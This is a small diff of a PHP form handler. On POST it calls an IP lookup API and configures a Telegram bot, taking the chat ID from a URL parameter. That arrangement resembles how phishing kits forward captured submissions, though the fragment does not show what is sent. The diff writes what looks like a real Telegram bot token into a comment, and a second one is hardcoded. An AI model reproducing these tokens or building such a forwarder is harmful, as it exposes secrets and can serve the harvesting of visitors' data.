@@ -41,7 +41,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // --- End IP API Call ---
 
     // --- Telegram Bot Configuration ---
-    // IMPORTANT: Replace 'YOUR_BOT_TOKEN_HERE' with your actual Telegram bot token.
+    // IMPORTANT: Replace '7898504197:AAFkTR0yuCN8pFuGn1a_UBkgA15CeldvGMc' with your actual Telegram bot token.
     $botToken = '7290451157:AAFoAI4fd8J2Zej0Q7xYY2dCZZxLQrEhMk0'; // Your actual Telegram Bot Token
 
     // Get the Telegram chat ID from the URL parameter '?id='
